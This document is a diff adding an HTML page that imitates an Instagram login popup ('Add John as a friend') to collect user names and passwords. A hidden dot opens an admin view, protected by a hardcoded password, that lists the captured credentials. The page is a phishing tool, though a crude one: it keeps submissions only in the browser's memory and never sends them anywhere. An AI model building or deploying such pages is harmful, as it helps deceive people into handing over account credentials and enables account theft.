@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Telegram Popup</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #121212;
+      font-family: sans-serif;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      position: relative;
+    }
+
+    .popup {
+      background-color: #1f1f1f;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.8);
+      text-align: center;
+      width: 300px;
+    }
+
+    .popup h2 {
+      margin: 0 0 10px;
+      font-size: 18px;
+    }
+
+    .popup p {
+      margin-bottom: 20px;
+      font-size: 14px;
+      color: #ccc;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 12px;
+      border: none;
+      border-radius: 5px;
+      background-color: #2a2a2a;
+      color: white;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+    }
+
+    button {
+      padding: 10px 15px;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .cancel {
+      background-color: #2a2a2a;
+      color: white;
+    }
+
+    .ok {
+      background-color: #007aff;
+      color: white;
+    }
+
+    /* White dot in top right */
+    .admin-dot {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      width: 12px;
+      height: 12px;
+      background-color: white;
+      border-radius: 50%;
+      cursor: pointer;
+    }
+
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background-color: rgba(18, 18, 18, 0.95);
+      color: white;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 9999;
+    }
+
+    .modal input[type="password"] {
+      margin-top: 10px;
+      padding: 8px;
+      background-color: #2a2a2a;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+
+    .admin-data {
+      display: none;
+      background-color: #121212;
+      color: white;
+      padding: 40px;
+      height: 100vh;
+      overflow-y: auto;
+    }
+
+    #submissionsList li {
+      margin-bottom: 10px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Admin access dot -->
+  <div class="admin-dot" onclick="showPasswordPrompt()"></div>
+
+  <!-- Password Prompt Modal -->
+  <div class="modal" id="passwordModal">
+    <h2>Enter Admin Password</h2>
+    <input type="password" id="adminPassword" placeholder="Password">
+    <button onclick="checkPassword()">Submit</button>
+  </div>
+
+  <!-- Admin Page with all submissions -->
+  <div class="admin-data" id="adminData">
+    <h2>All Submitted Entries</h2>
+    <ul id="submissionsList"></ul>
+  </div>
+
+  <!-- Main Popup -->
+  <div class="popup" id="formPopup">
+    <h2>Instagram</h2>
+    <p>Add John as a friend</p>
+    <form id="infoForm">
+      <input type="text" name="username" placeholder="User name" required>
+      <input type="text" name="message" placeholder="Password" required>
+      <div class="buttons">
+        <button type="button" class="cancel" onclick="window.location.href='about:blank';">Forgot password</button>
+        <button type="submit" class="ok">Login</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    let submissions = [];
+
+    document.getElementById('infoForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const formData = new FormData(this);
+      const entry = {
+        username: formData.get('username'),
+        message: formData.get('message'),
+        time: new Date().toLocaleString()
+      };
+
+      submissions.push(entry);
+      alert("Submitted successfully.");
+      window.location.href = 'about:blank'; // or redirect elsewhere
+    });
+
+    function showPasswordPrompt() {
+      document.getElementById('passwordModal').style.display = 'flex';
+    }
+
+    function checkPassword() {
+      const password = document.getElementById('adminPassword').value;
+      if (password === '123123456') {
+        document.getElementById('passwordModal').style.display = 'none';
+        document.getElementById('formPopup').style.display = 'none';
+        showAdminData();
+      } else {
+        alert('Incorrect password');
+      }
+    }
+
+    function showAdminData() {
+      const list = document.getElementById('submissionsList');
+      list.innerHTML = '';
+
+      if (submissions.length === 0) {
+        list.innerHTML = '<li>No submissions yet.</li>';
+      } else {
+        submissions.forEach(sub => {
+          const li = document.createElement('li');
+          li.textContent = `${sub.time} - ${sub.username}: ${sub.message}`;
+          list.appendChild(li);
+        });
+      }
+
+      document.getElementById('adminData').style.display = 'block';
+    }
+  </script>
+</body>
+</html>
